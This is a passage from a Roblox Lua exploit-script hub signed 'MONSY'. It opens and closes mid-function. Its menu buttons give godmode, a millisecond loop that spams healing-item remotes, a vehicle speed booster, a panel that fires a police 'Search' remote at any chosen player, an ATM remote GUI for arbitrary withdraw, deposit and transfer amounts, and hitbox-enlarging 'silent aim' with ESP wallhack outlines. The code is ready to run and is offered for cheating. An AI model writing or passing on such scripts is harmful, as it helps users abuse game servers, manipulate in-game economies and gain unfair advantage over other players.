local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")

Humanoid.MaxHealth = math.huge
Humanoid.Health = math.huge

Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)

game:GetService("RunService").Heartbeat:Connect(function()
    if Humanoid.Health < math.huge then
        Humanoid.Health = math.huge
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("URBAN DECAY RP GODMODE (MONSY)", function()
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local RS = game:GetService("ReplicatedStorage")
local Remote = RS:WaitForChild("ConsumeFoodDrink", 9e9)

local sg = Instance.new("ScreenGui")
sg.ResetOnSpawn = false
sg.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 150, 0, 80)
frame.Position = UDim2.new(0.5, -75, 0.5, -40)
frame.BackgroundColor3 = Color3.new(1,1,1)
frame.Active = true
frame.Draggable = true
frame.Parent = sg

local uc = Instance.new("UICorner", frame)
uc.CornerRadius = UDim.new(0, 14)

-- MONSY
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1,0,0,30)
title.BackgroundTransparency = 1
title.Text = "MONSY"
title.TextColor3 = Color3.new(0,0,0)
title.TextSize = 24
title.Font = Enum.Font.Roboto
title.Parent = frame

-- GODMODE button
local btn = Instance.new("TextButton")
btn.Size = UDim2.new(0, 110, 0, 36)
btn.Position = UDim2.new(0.5, -55, 0.5, 6)
btn.BackgroundColor3 = Color3.new(1,1,1)
btn.Text = "GODMODE"
btn.TextColor3 = Color3.new(0,0,0)
btn.TextSize = 18
btn.Font = Enum.Font.Roboto
btn.AutoButtonColor = false
btn.Parent = frame

local bc = Instance.new("UICorner", btn)
bc.CornerRadius = UDim.new(0, 10)

-- DOT — PINAKA-GILID NA TALAGA (nakadikit na sa right edge)
local dot = Instance.new("Frame")
dot.Size = UDim2.new(0, 10, 0, 10)
dot.Position = UDim2.new(1, -4, 0.5, -5)  -- -11 = halos nakadikit na sa gilid
dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)  -- red = off
dot.BorderSizePixel = 0
dot.ZIndex = 10
dot.Parent = btn

local dc = Instance.new("UICorner", dot)
dc.CornerRadius = UDim.new(1, 0)

-- Toggle
local on = false

btn.MouseButton1Click:Connect(function()
    on = not on
    if on then
        dot.BackgroundColor3 = Color3.fromRGB(0, 255, 0)  -- green = ON
        task.spawn(function()
            while on do
                Remote:FireServer("Medkit", "Medkit1765239888.7844067")
                Remote:FireServer("Syringe", "Syringe1765239882.6818311")
                task.wait(0.001)
            end
        end)
    else
        dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0) 
    end
end)

player.CharacterAdded:Connect(function()
    if on then
        on = false
        dot.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR BOOSTER / B TO BOOST / J TO OPEN SETTINGS (MONSY)", function()
	local DEFAULTS = {
    MAX_BOOST_FORCE = 150,
    BOOST_INCREMENT = 3,
    BOOST_INTERVAL = 0.05,
}

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer

local boosting = false
local currentSeat = nil
local boostConnection = nil
local boostConfig = table.clone(DEFAULTS)
local settingsVisible = false

local function getVehicleMainPart(seat)
    local model = seat:FindFirstAncestorOfClass("Model")
    if model and model.PrimaryPart then return model.PrimaryPart end
    for _, p in ipairs(model:GetDescendants()) do
        if p:IsA("BasePart") and p.Name:lower():find("chassis") then return p end
    end
    return seat
end

local function startBoost(seat)
    if boosting or not seat then return end
    boosting = true
    local part = getVehicleMainPart(seat)
    if not part then return end

    local trail = Instance.new("ParticleEmitter")
    trail.Texture = "rbxassetid://242830270"
    trail.Color = ColorSequence.new(Color3.new(1, 1, 1))
    trail.Size = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0)})
    trail.Rate = 50
    trail.Speed = NumberRange.new(5, 10)
    trail.Lifetime = NumberRange.new(0.3)
    trail.Transparency = NumberSequence.new(0.2, 1)
    trail.VelocitySpread = 30
    trail.Name = ""
    trail.Parent = part

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://72642478827550"
    sound.Looped = true
    sound.Volume = 0.4
    sound.Name = ""
    sound.Parent = part
    sound:Play()

    boostConnection = RunService.Heartbeat:Connect(function()
        if not boosting then return end
        local speed = part.AssemblyLinearVelocity.Magnitude
        local label = player.PlayerGui:FindFirstChild("BoostGui") and player.PlayerGui.BoostGui:FindFirstChild("SpeedLabel")
        if label then
            label.Text = "Speed: " .. math.floor(speed + 0.5)
            label.Visible = true
        end

        local currentVelocity = part.AssemblyLinearVelocity
        local forwardDir = seat.CFrame.LookVector
        local forwardSpeed = currentVelocity:Dot(forwardDir)
        local additionalSpeed = math.min(boostConfig.BOOST_INCREMENT, boostConfig.MAX_BOOST_FORCE - forwardSpeed)
        local newVelocity = currentVelocity + (forwardDir * additionalSpeed)
        part.AssemblyLinearVelocity = newVelocity
    end)
end

local function stopBoost()
    boosting = false
    if boostConnection then boostConnection:Disconnect() end
    boostConnection = nil

    if currentSeat then
        local part = getVehicleMainPart(currentSeat)
        if part then
            local trail = part:FindFirstChild("BoostTrail")
            if trail then trail:Destroy() end
            local sound = part:FindFirstChild("BoostSound")
            if sound then sound:Stop() sound:Destroy() end
        end
    end

    local label = player.PlayerGui:FindFirstChild("BoostGui") and player.PlayerGui.BoostGui:FindFirstChild("SpeedLabel")
    if label then label.Visible = false end
end

local function createSlider(name, min, max, default, onChanged)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, -16, 0, 38)
    container.BackgroundTransparency = 1

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.5, 0)
    label.BackgroundTransparency = 1
    label.Text = name .. ": " .. tostring(default)
    label.TextColor3 = Color3.new(0,0,0)
    label.Font = Enum.Font.Roboto
    label.TextScaled = true
    label.Parent = container

    local slider = Instance.new("TextButton")
    slider.Size = UDim2.new(1, 0, 0.45, 0)
    slider.Position = UDim2.new(0, 0, 0.55, 0)
    slider.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    slider.Text = ""
    slider.AutoButtonColor = false
    slider.Parent = container

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0.6, 0)
    corner.Parent = slider

    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
    fill.BorderSizePixel = 0
    fill.Parent = slider

    local fillCorner = Instance.new("UICorner")
    fillCorner.CornerRadius = UDim.new(0.6, 0)
    fillCorner.Parent = fill

    local dragging = false
    local function updateFromInput(input)
        local scale = math.clamp((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X, 0, 1)
        fill.Size = UDim2.new(scale, 0, 1, 0)
        local value = min + (max - min) * scale
        value = tonumber(string.format("%.1f", value))
        label.Text = name .. ": " .. value
        onChanged(value)
    end

    slider.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            updateFromInput(input)
        end
    end)
    slider.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    slider.InputChanged:Connect(function(input)
        if dragging then updateFromInput(input) end
    end)

    return container
end

local function createBoostGui()
    local gui = Instance.new("ScreenGui")
    gui.Name = ""
    gui.IgnoreGuiInset = true
    gui.ResetOnSpawn = false
    gui.Parent = player:WaitForChild("PlayerGui")

    local speedLabel = Instance.new("TextLabel")
    speedLabel.Name = ""
    speedLabel.Size = UDim2.new(0, 100, 0, 35)
    speedLabel.Position = UDim2.new(0, 20, 0.5, -85)
    speedLabel.BackgroundColor3 = Color3.fromRGB(255,255,255)
    speedLabel.TextColor3 = Color3.new(0,0,0)
    speedLabel.BackgroundTransparency = 0.3
    speedLabel.TextScaled = true
    speedLabel.Font = Enum.Font.Roboto
    speedLabel.Text = "Speed: 0"
    speedLabel.Visible = false
    speedLabel.Parent = gui
    local lCorner = Instance.new("UICorner", speedLabel)
    lCorner.CornerRadius = UDim.new(0.2, 0)

    local settingsPanel = Instance.new("Frame")
    settingsPanel.Name = ""
    settingsPanel.Size = UDim2.new(0, 200, 0, 180)
    settingsPanel.Position = UDim2.new(1, -220, 0.5, 0)  -- FIXED RIGHT + CENTERED VERTICALLY
    settingsPanel.BackgroundColor3 = Color3.fromRGB(255,255,255)
    settingsPanel.Visible = false
    settingsPanel.Parent = gui
    local panelCorner = Instance.new("UICorner", settingsPanel)
    panelCorner.CornerRadius = UDim.new(0.1, 0)

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 25)
    title.BackgroundTransparency = 1
    title.Text = "MONSY BOOST"
    title.TextColor3 = Color3.new(0,0,0)
    title.Font = Enum.Font.Roboto
    title.TextScaled = true
    title.Parent = settingsPanel

    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Padding = UDim.new(0, 2)
    UIListLayout.FillDirection = Enum.FillDirection.Vertical
    UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Top
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Parent = settingsPanel

    local resetBtn = Instance.new("TextButton")
    resetBtn.Size = UDim2.new(1, -16, 0, 30)
    resetBtn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    resetBtn.Text = "Reset"
    resetBtn.TextColor3 = Color3.new(0,0,0)
    resetBtn.TextScaled = true
    resetBtn.Font = Enum.Font.Roboto
    resetBtn.LayoutOrder = 0
    resetBtn.Parent = settingsPanel
    local rCorner = Instance.new("UICorner", resetBtn)
    rCorner.CornerRadius = UDim.new(0.6, 0)

    local sliders = {
        createSlider("Max Force", 50, 1000, boostConfig.MAX_BOOST_FORCE, function(v) boostConfig.MAX_BOOST_FORCE = v end),
        createSlider("Increment", 1, 20, boostConfig.BOOST_INCREMENT, function(v) boostConfig.BOOST_INCREMENT = v end),
        createSlider("Interval", 0.01, 0.5, boostConfig.BOOST_INTERVAL, function(v) boostConfig.BOOST_INTERVAL = v end),
    }
    for i, slider in ipairs(sliders) do
        slider.LayoutOrder = i + 1
        slider.Parent = settingsPanel
    end

    resetBtn.MouseButton1Click:Connect(function()
        boostConfig = table.clone(DEFAULTS)
        for _, s in ipairs(sliders) do s:Destroy() end
        sliders = {
            createSlider("Max Force", 50, 1000, boostConfig.MAX_BOOST_FORCE, function(v) boostConfig.MAX_BOOST_FORCE = v end),
            createSlider("Increment", 1, 20, boostConfig.BOOST_INCREMENT, function(v) boostConfig.BOOST_INCREMENT = v end),
            createSlider("Interval", 0.01, 0.5, boostConfig.BOOST_INTERVAL, function(v) boostConfig.BOOST_INTERVAL = v end),
        }
        for i, s in ipairs(sliders) do
            s.LayoutOrder = i + 1
            s.Parent = settingsPanel
        end
    end)

    return gui, settingsPanel
end

local function setupBoost(character)
    local playerGui = player:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("BoostGui") then playerGui.BoostGui:Destroy() end
    local gui, settingsPanel = createBoostGui()

    UserInputService.InputBegan:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.B and currentSeat then
            startBoost(currentSeat)
        elseif input.KeyCode == Enum.KeyCode.J then
            settingsVisible = not settingsVisible
            settingsPanel.Visible = settingsVisible
        end
    end)

    UserInputService.InputEnded:Connect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.B then
            stopBoost()
        end
    end)

    local function monitorSeat(seat)
        if not seat:IsA("VehicleSeat") then return end
        seat:GetPropertyChangedSignal("Occupant"):Connect(function()
            local occupant = seat.Occupant
            if occupant and occupant.Parent == character then
                currentSeat = seat
            elseif currentSeat == seat then
                currentSeat = nil
                stopBoost()
            end
        end)
    end

    for _, s in ipairs(workspace:GetDescendants()) do monitorSeat(s) end
    workspace.DescendantAdded:Connect(monitorSeat)
end

repeat wait() until player.Character
setupBoost(player.Character)
player.CharacterAdded:Connect(function(char)
    repeat wait() until char:FindFirstChild("Humanoid")
    setupBoost(char)
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("URBAN CITY REVAMPED CONFISCATE GUI (MONSY) ", function()
	local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UIS = game:GetService("UserInputService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui
ScreenGui.Name = ""

local ListFrame = Instance.new("Frame")
ListFrame.Size = UDim2.new(0, 180, 0, 400)
ListFrame.Position = UDim2.new(0, 10, 0.5, -200)
ListFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ListFrame.BorderSizePixel = 0
ListFrame.Parent = ScreenGui

Instance.new("UICorner", ListFrame).CornerRadius = UDim.new(0, 12)

local ListTitle = Instance.new("TextLabel")
ListTitle.Text = "PLAYERS ONLINE"
ListTitle.Font = Enum.Font.Roboto
ListTitle.TextSize = 16
ListTitle.TextColor3 = Color3.fromRGB(0, 0, 0)
ListTitle.BackgroundTransparency = 1
ListTitle.Size = UDim2.new(1, 0, 0, 35)
ListTitle.Parent = ListFrame

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Size = UDim2.new(1, -10, 1, -45)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ScrollingFrame.Parent = ListFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Padding = UDim.new(0, 4)
UIListLayout.Parent = ScrollingFrame

local playerButtons = {}

local function addPlayerToList(player)
	if playerButtons[player] then return end

	local btn = Instance.new("TextButton")
	btn.Size = UDim2.new(1, -10, 0, 35)
	btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
	btn.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	btn.TextColor3 = Color3.fromRGB(0, 0, 0)
	btn.Font = Enum.Font.Roboto
	btn.TextSize = 14
	btn.TextXAlignment = Enum.TextXAlignment.Left
	btn.Parent = ScrollingFrame

	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 8)

	local padding = Instance.new("UIPadding")
	padding.PaddingLeft = UDim.new(0, 10)
	padding.Parent = btn

	btn.MouseButton1Click:Connect(function()
		if player.Character then
			local args = { player.Character }
			ReplicatedStorage:WaitForChild("Police", 9e9):WaitForChild("Search", 9e9):FireServer(unpack(args))
		end
	end)

	playerButtons[player] = btn
end

local function removePlayerFromList(player)
	if playerButtons[player] then
		playerButtons[player]:Destroy()
		playerButtons[player] = nil
	end
end

for _, player in ipairs(Players:GetPlayers()) do
	addPlayerToList(player)
end

Players.PlayerAdded:Connect(addPlayerToList)
Players.PlayerRemoving:Connect(removePlayerFromList)

local open = true
UIS.InputBegan:Connect(function(key, typing)
	if typing then return end
	if key.KeyCode == Enum.KeyCode.P then
		open = not open
		ListFrame.Visible = open
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("DOMINION CITY BANK GUI (MONSY)", function()
    local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- ScreenGui
local FantasyGUI = Instance.new("ScreenGui")
FantasyGUI.Name = ""
FantasyGUI.ResetOnSpawn = false
FantasyGUI.Parent = pgui

-- Main Frame — PURE WHITE
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 360, 0, 300)
MainFrame.Position = UDim2.new(0.5, -180, 0.3, -150)
MainFrame.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE NA
MainFrame.BorderSizePixel = 0
MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
MainFrame.Parent = FantasyGUI

local FrameCorner = Instance.new("UICorner")
FrameCorner.CornerRadius = UDim.new(0, 18)
FrameCorner.Parent = MainFrame

local FrameStroke = Instance.new("UIStroke")
FrameStroke.Color = Color3.new(0, 0, 0)                -- BLACK BORDER
FrameStroke.Thickness = 2
FrameStroke.Parent = MainFrame

-- Title Bar — WHITE
local TitleBar = Instance.new("Frame")
TitleBar.Size = UDim2.new(1, 0, 0, 45)
TitleBar.BackgroundColor3 = Color3.new(1, 1, 1)        -- WHITE
TitleBar.BorderSizePixel = 0
TitleBar.Parent = MainFrame

local TitleBarCorner = Instance.new("UICorner")
TitleBarCorner.CornerRadius = UDim.new(0, 18)
TitleBarCorner.Parent = TitleBar

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Size = UDim2.new(1, 0, 1, 0)
TitleLabel.BackgroundTransparency = 1
TitleLabel.Text = "DOMINION CITY"
TitleLabel.Font = Enum.Font.Roboto
TitleLabel.TextSize = 24
TitleLabel.TextColor3 = Color3.fromRGB(0,0,0)          -- BLACK TEXT
TitleLabel.Parent = TitleBar

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 36, 0, 36)
CloseBtn.Position = UDim2.new(1, -40, 0, 4)
CloseBtn.BackgroundTransparency = 1
CloseBtn.Text = "X"
CloseBtn.Font = Enum.Font.Roboto
CloseBtn.TextSize = 20
CloseBtn.TextColor3 = Color3.fromRGB(0,0,0)            -- BLACK
CloseBtn.Parent = TitleBar
CloseBtn.MouseButton1Click:Connect(function()
    FantasyGUI:Destroy()
end)

-- Dragging (same)
local dragging, dragInput, dragStart, startPos
local function updateInput(input)
    local delta = input.Position - dragStart
    MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
TitleBar.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)
TitleBar.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
end)
UserInputService.InputChanged:Connect(function(input)
    if dragging and input == dragInput then updateInput(input) end
end)

-- Amount
local AmountLabel = Instance.new("TextLabel")
AmountLabel.Size = UDim2.new(0, 100, 0, 30)
AmountLabel.Position = UDim2.new(0, 30, 0, 60)
AmountLabel.BackgroundTransparency = 1
AmountLabel.Text = "Amount:"
AmountLabel.Font = Enum.Font.Roboto
AmountLabel.TextSize = 16
AmountLabel.TextColor3 = Color3.fromRGB(0,0,0)         -- BLACK
AmountLabel.Parent = MainFrame

local AmountBox = Instance.new("TextBox")
AmountBox.Size = UDim2.new(0, 200, 0, 36)
AmountBox.Position = UDim2.new(0, 130, 0, 57)
AmountBox.PlaceholderText = "Amount"
AmountBox.Text = ""
AmountBox.ClearTextOnFocus = true
AmountBox.Font = Enum.Font.Roboto
AmountBox.TextSize = 16
AmountBox.TextColor3 = Color3.fromRGB(0,0,0)           -- BLACK TEXT
AmountBox.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE BG
AmountBox.BorderSizePixel = 1
AmountBox.BorderColor3 = Color3.fromRGB(0, 0, 0)       -- BLACK BORDER
AmountBox.Parent = MainFrame

local AmountCorner = Instance.new("UICorner")
AmountCorner.CornerRadius = UDim.new(0, 10)
AmountCorner.Parent = AmountBox

-- USERNAME
local IDLabel = Instance.new("TextLabel")
IDLabel.Size = UDim2.new(0, 100, 0, 30)
IDLabel.Position = UDim2.new(0, 30, 0, 100)
IDLabel.BackgroundTransparency = 1
IDLabel.Text = "USERNAME:"
IDLabel.Font = Enum.Font.Roboto
IDLabel.TextSize = 16
IDLabel.TextColor3 = Color3.fromRGB(0,0,0)             -- BLACK
IDLabel.Parent = MainFrame

local IDBox = Instance.new("TextBox")
IDBox.Size = UDim2.new(0, 200, 0, 36)
IDBox.Position = UDim2.new(0, 130, 0, 97)
IDBox.PlaceholderText = "Username"
IDBox.Text = ""
IDBox.ClearTextOnFocus = true
IDBox.Font = Enum.Font.Roboto
IDBox.TextSize = 16
IDBox.TextColor3 = Color3.fromRGB(0,0,0)               -- BLACK TEXT
IDBox.BackgroundColor3 = Color3.new(1, 1, 1)           -- WHITE BG
IDBox.BorderSizePixel = 1
IDBox.BorderColor3 = Color3.fromRGB(0, 0, 0)           -- BLACK BORDER
IDBox.Parent = MainFrame

local IDCorner = Instance.new("UICorner")
IDCorner.CornerRadius = UDim.new(0, 10)
IDCorner.Parent = IDBox

-- Modes Buttons — WHITE + BLACK TEXT
local modes = {"WITHDRAW", "DEPOSIT", "TRANSFER"}
local currentMode = "WITHDRAW"
local modeButtons = {}

for i, mode in ipairs(modes) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 38)
    btn.Position = UDim2.new(0, 30 + (i-1)*110, 0, 145)
    btn.BackgroundColor3 = Color3.new(1, 1, 1)         -- WHITE
    btn.Text = mode
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 15
    btn.TextColor3 = Color3.fromRGB(0,0,0)             -- BLACK TEXT
    btn.BorderSizePixel = 1
    btn.BorderColor3 = Color3.fromRGB(0, 0, 0)         -- BLACK BORDER
    btn.Parent = MainFrame

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn

    btn.MouseButton1Click:Connect(function()
        currentMode = mode
        for _, b in ipairs(modeButtons) do
            TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Color3.new(1, 1, 1)}):Play()
        end
        TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
        IDLabel.Visible = (mode == "TRANSFER")
        IDBox.Visible = (mode == "TRANSFER")
    end)

    table.insert(modeButtons, btn)
    if i == 1 then
        TweenService:Create(btn, TweenInfo.new(0), {BackgroundColor3 = Color3.fromRGB(200, 200, 200)}):Play()
    end
end

-- Execute Button — WHITE + BLACK TEXT
local ExecuteBtn = Instance.new("TextButton")
ExecuteBtn.Size = UDim2.new(0, 300, 0, 45)
ExecuteBtn.Position = UDim2.new(0.5, -150, 0, 200)
ExecuteBtn.BackgroundColor3 = Color3.new(1, 1, 1)       -- WHITE
ExecuteBtn.Text = "EXECUTE"
ExecuteBtn.Font = Enum.Font.Roboto
ExecuteBtn.TextSize = 18
ExecuteBtn.TextColor3 = Color3.fromRGB(0,0,0)           -- BLACK TEXT
ExecuteBtn.BorderSizePixel = 2
ExecuteBtn.BorderColor3 = Color3.fromRGB(0, 0, 0)       -- BLACK BORDER
ExecuteBtn.Parent = MainFrame

local ExecCorner = Instance.new("UICorner")
ExecCorner.CornerRadius = UDim.new(0, 12)
ExecCorner.Parent = ExecuteBtn

ExecuteBtn.MouseButton1Click:Connect(function()
    local amount = tonumber(AmountBox.Text) or 0
    local args

    if currentMode == "WITHDRAW" then
        args = { "Withdraw", amount }
    elseif currentMode == "DEPOSIT" then
        args = { "Deposit", amount }
    elseif currentMode == "TRANSFER" then
        local username = tostring(IDBox.Text)
        if username == "" then return end
        args = { "Transfer", amount, username }
    end

    game:GetService("ReplicatedStorage")
        :WaitForChild("ATM", 9e9)
        :FireServer(unpack(args))
end)

-- Glow (optional — mas maganda kung grayish white)
local Glow = Instance.new("ImageLabel")
Glow.Size = UDim2.new(1, 60, 1, 60)
Glow.Position = UDim2.new(0, -30, 0, -30)
Glow.BackgroundTransparency = 1
Glow.Image = "rbxassetid://2415002530"
Glow.ImageColor3 = Color3.fromRGB(200, 200, 200)
Glow.ImageTransparency = 0.9
Glow.ScaleType = Enum.ScaleType.Slice
Glow.SliceCenter = Rect.new(100, 100, 100, 100)
Glow.Parent = MainFrame

IDLabel.Visible = false
IDBox.Visible = false
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SILENT AIM BIGHEAD UNIVERSAL (MONSY)", function()
   _G.HeadSize = 1
_G.HeadTransparency = 1.0
_G.Disabled = false
local ESP_ENABLED = true

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

local Original = {}

local function storeOriginal(player, head)
    if not Original[player] then
        Original[player] = {
            Size = head.Size,
            Transparency = head.Transparency,
            Color = head.BrickColor,
            Material = head.Material,
            Collide = head.CanCollide,
            Massless = head.Massless
        }
    end
end

local function updateHead(head, player)
    if not head or player == LocalPlayer then return end
    
    storeOriginal(player, head)
    
    if not _G.Disabled then
        head.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
        head.Transparency = _G.HeadTransparency
        head.BrickColor = BrickColor.new("Really red")
        head.Material = Enum.Material.Neon
        head.CanCollide = false
        head.Massless = true
    else
        local data = Original[player]
        if data then
            head.Size = data.Size
            head.Transparency = data.Transparency
            head.BrickColor = data.Color
            head.Material = data.Material
            head.CanCollide = data.Collide
            head.Massless = data.Massless
        end
    end
end

RunService.RenderStepped:Connect(function()
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("Head") then
            pcall(updateHead, p.Character.Head, p)
        end
    end
end)

Players.PlayerAdded:Connect(function(p)
    p.CharacterAdded:Connect(function(c)
        if c:FindFirstChild("Head") then
            updateHead(c.Head, p)
        end
    end)
end)

local ESP_Outlines = {}

local function createESP(player)
    if not ESP_ENABLED then return end
    if player == LocalPlayer then return end
    if ESP_Outlines[player] then return end
    
    local character = player.Character
    if not character or not character.Parent then return end
    
    local highlight = Instance.new("Highlight")
    highlight.Name = "ESP"
    highlight.FillTransparency = 1
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.OutlineTransparency = 0.2
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Adornee = character
    highlight.Parent = character
    
    ESP_Outlines[player] = highlight
end

local function removeESP(player)
    if ESP_Outlines[player] then
        if ESP_Outlines[player].Parent then
            ESP_Outlines[player]:Destroy()
        end
        ESP_Outlines[player] = nil
    end
end

local function onCharacterAdded(character)
    if not character then return end
    
    local player = Players:GetPlayerFromCharacter(character)
    if not player or player == LocalPlayer then return end
    
    task.delay(0.15, function()
        if character.Parent and player.Parent then
            createESP(player)
        end
    end)
end

local function setupPlayer(player)
    if player == LocalPlayer then return end
    if player.Character then
        createESP(player)
    end
    player.CharacterAdded:Connect(onCharacterAdded)
    player.CharacterRemoving:Connect(function()
        removeESP(player)
    end)
end

for _, player in ipairs(Players:GetPlayers()) do
    setupPlayer(player)
end

Players.PlayerAdded:Connect(setupPlayer)
Players.PlayerRemoving:Connect(removeESP)

RunService.Heartbeat:Connect(function()
    for player, hl in pairs(ESP_Outlines) do
        if not player.Parent or not player.Character or not player.Character.Parent or not hl.Parent then
            removeESP(player)
        end
    end
end)

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

local function round(obj, r)
    local c = Instance.new("UICorner", obj)
    c.CornerRadius = UDim.new(0, r)
end

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 220, 0, 210)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.Active = true
Frame.Draggable = true
round(Frame, 10)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundTransparency = 1
Title.Text = "// @ Monsy"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.RobotoMono
Title.TextSize = 15
Title.TextXAlignment = Enum.TextXAlignment.Center

local SliderBack = Instance.new("Frame", Frame)
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.28, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(0,0,0)
round(SliderBack, 8)

local SliderFill = Instance.new("Frame", SliderBack)
SliderFill.Size = UDim2.new(0, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
round(SliderFill, 8)

local SliderButton = Instance.new("TextButton", SliderBack)
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(0,0,0)
SliderButton.Text = ""
round(SliderButton, 10)

local SizeLabel = Instance.new("TextLabel", Frame)
SizeLabel.Size = UDim2.new(1, 0, 0, 20)
SizeLabel.Position = UDim2.new(0, 0, 0.37, 0)
SizeLabel.BackgroundTransparency = 1
SizeLabel.TextColor3 = Color3.fromRGB(0,0,0)
SizeLabel.Font = Enum.Font.RobotoMono
SizeLabel.TextSize = 14
SizeLabel.Text = "Size: " .. _G.HeadSize

local Circle = Drawing.new("Circle")
Circle.Color = Color3.fromRGB(255,255,255)
Circle.Thickness = 2
Circle.NumSides = 100
Circle.Radius = 60
Circle.Filled = false
Circle.Visible = true

RunService.RenderStepped:Connect(function()
    local vp = workspace.CurrentCamera.ViewportSize / 2
    Circle.Position = Vector2.new(vp.X, vp.Y)
end)

local draggingSize = false

local function updateSize(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    _G.HeadSize = 1 + percent * 34
